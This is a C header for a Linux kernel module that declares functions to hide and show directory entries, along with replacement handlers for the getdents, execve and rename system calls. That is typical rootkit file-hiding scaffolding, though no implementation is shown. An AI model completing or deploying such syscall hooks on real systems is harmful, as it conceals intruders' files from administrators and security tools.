#ifndef HIDE_H
#define HIDE_H

#include <linux/err.h>
#include <linux/errno.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/unistd.h>
#include <asm/paravirt.h>
#include <linux/kallsyms.h>
#include <linux/gfp.h>
#include <linux/slab.h>
#include <linux/init.h>
#include <linux/types.h>
#include <linux/stat.h>
#include <linux/fcntl.h>
#include <linux/errno.h>
#include <linux/fs.h>
#include <linux/dcache.h>
#include <linux/namei.h>
#include <linux/path.h>
#include <linux/cred.h>
#include <linux/fdtable.h>
#include <linux/dcache.h>
#include <linux/err.h>
#include <linux/limits.h>
#include <linux/uaccess.h>

#include "sctm.h"

/* hide/show directory entries */

typedef struct linux_dirent{
    unsigned long  d_ino;     /* Inode number */
    unsigned long  d_off;     /* Offset to next linux_dirent */
    unsigned short d_reclen;  /* Length of this linux_dirent */
    //char           d_type;    // File type (only since Linux 2.6.4;
    char           d_name[];  /* Filename (null-terminated) */
                        /* length is actually (d_reclen - 2 -
                           offsetof(struct linux_dirent, d_name) */
    /*
    char           pad;       // Zero padding byte*/
                              // offset is (d_reclen - 1))


} linux_dirent;

/* hide a directory entry */
int hide(const char __user *path);

int hide_exit(void);

int hide_init(struct sctm *sctm);

static asmlinkage int new_getdents(unsigned int fd,struct linux_dirent* dirp,
                    unsigned int count);
static asmlinkage int new_execve(const char *pathname, char *const argv[], char *const envp[]);
static asmlinkage int new_rename(const char* pathname, const char* action);

/* show a directory entry */
int show(const char __user *path);

#endif

